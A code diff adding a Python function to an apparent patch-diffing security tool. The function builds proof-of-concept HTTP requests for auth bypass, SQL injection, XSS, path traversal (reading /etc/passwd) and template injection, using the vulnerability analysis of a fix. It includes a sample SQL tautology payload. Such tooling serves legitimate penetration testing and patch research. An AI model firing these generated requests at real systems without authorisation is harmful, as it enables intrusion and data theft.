@@ -585,6 +585,125 @@ def analyze_patch_diff(patch_text: str) -> PatchDiffAnalysis:
     )
 
 
+def generate_poc_from_analysis(analysis: "PatchDiffAnalysis",
+                               base_url: str = "http://TARGET",
+                               http_method: str = "GET",
+                               auth_header: str = "") -> str:
+    """Generate a minimal PoC HTTP request from a PatchDiffAnalysis.
+
+    Returns a formatted HTTP request block that can be pasted into Burp Repeater
+    or used as a curl command. The PoC is generated purely from the diff analysis
+    — it does NOT require a live target.
+
+    Example output (for SQLi):
+        GET /api/users?id='+OR+'1'='1 HTTP/1.1
+        Host: TARGET
+        [Authorization: Bearer TOKEN]
+
+        # Expected: SQL error or bypass response
+    """
+    if not analysis or not analysis.fix_class or analysis.fix_class == "unknown":
+        return ""
+
+    param = analysis.suggested_param
+    payload = analysis.suggested_value
+    endpoint = analysis.vuln_file or "/vulnerable-endpoint"
+    # Normalize endpoint: use just the filename portion if it's a source path
+    if "/" in endpoint and not endpoint.startswith("/"):
+        # e.g. "src/views/user.php" → "/user" (guessed API path)
+        _fname = endpoint.rsplit("/", 1)[-1]
+        _name_no_ext = _fname.rsplit(".", 1)[0] if "." in _fname else _fname
+        endpoint = f"/api/{_name_no_ext}"
+
+    _host = base_url.replace("http://", "").replace("https://", "").rstrip("/")
+
+    lines = []
+    if analysis.fix_class in ("auth_bypass", "missing_auth_bypass"):
+        # Auth bypass: show both with and without auth header
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        lines.append(f"# Sends request WITHOUT authentication to {endpoint}")
+        if http_method.upper() == "GET":
+            lines.append(f"GET {endpoint} HTTP/1.1")
+        else:
+            lines.append(f"POST {endpoint} HTTP/1.1")
+        lines.append(f"Host: {_host}")
+        lines.append("# No Authorization header — test for missing auth")
+        if http_method.upper() == "POST":
+            lines.append("")
+            lines.append("{}")
+        lines.append("")
+        lines.append("# Expected: 200 OK with private data (not 401/403)")
+        lines.append(f"# Vulnerable function: {analysis.vuln_function} in {analysis.vuln_file}")
+
+    elif analysis.fix_class in ("sqli", "injection") and param and payload:
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        if http_method.upper() == "GET":
+            lines.append(f"GET {endpoint}?{param}={payload.replace(' ', '%20')} HTTP/1.1")
+        else:
+            lines.append(f"POST {endpoint} HTTP/1.1")
+            lines.append(f"Host: {_host}")
+            lines.append("Content-Type: application/x-www-form-urlencoded")
+            if auth_header:
+                lines.append(f"Authorization: {auth_header}")
+            lines.append("")
+            lines.append(f"{param}={payload}")
+            lines.append("")
+            lines.append("# Expected: SQL error OR data returned that shouldn't be accessible")
+            lines.append(f"# Vulnerable function: {analysis.vuln_function}")
+            return "\n".join(lines)
+        lines.append(f"Host: {_host}")
+        if auth_header:
+            lines.append(f"Authorization: {auth_header}")
+        lines.append("")
+        lines.append("# Expected: SQL error OR unauthorized data")
+        lines.append(f"# Vulnerable function: {analysis.vuln_function}")
+
+    elif analysis.fix_class in ("xss",) and param and payload:
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        _encoded_payload = payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22")
+        if http_method.upper() == "GET":
+            lines.append(f"GET {endpoint}?{param}={_encoded_payload} HTTP/1.1")
+        else:
+            lines.append(f"POST {endpoint} HTTP/1.1")
+            lines.append(f"Host: {_host}")
+            lines.append("Content-Type: application/x-www-form-urlencoded")
+            lines.append("")
+            lines.append(f"{param}={payload}")
+            lines.append("")
+            lines.append("# Expected: response body contains unescaped <script>alert...")
+            return "\n".join(lines)
+        lines.append(f"Host: {_host}")
+        lines.append("")
+        lines.append("# Expected: response body contains unescaped <script>alert...")
+
+    elif analysis.fix_class == "path_traversal" and param and payload:
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        lines.append(f"GET {endpoint}?{param}={payload} HTTP/1.1")
+        lines.append(f"Host: {_host}")
+        lines.append("")
+        lines.append("# Expected: contents of /etc/passwd in response")
+        lines.append(f"# Vulnerable function: {analysis.vuln_function}")
+
+    elif analysis.fix_class == "ssti" and param and payload:
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        lines.append(f"GET {endpoint}?{param}={payload} HTTP/1.1")
+        lines.append(f"Host: {_host}")
+        lines.append("")
+        lines.append("# Expected: response contains '49' (7*7 evaluated)")
+
+    else:
+        # Generic PoC hint
+        if param and payload:
+            lines.append(f"# PoC hint: {analysis.fix_class}")
+            lines.append(f"# Parameter: {param!r}")
+            lines.append(f"# Payload:   {payload!r}")
+            lines.append(f"# Function:  {analysis.vuln_function} in {analysis.vuln_file}")
+        else:
+            return ""
+
+    return "\n".join(lines)
+
+
 def render_patchdiff(res: DiffResult) -> str:
     cve_hdr = f" ({res.cve_id})" if res.cve_id else ""
     out = [
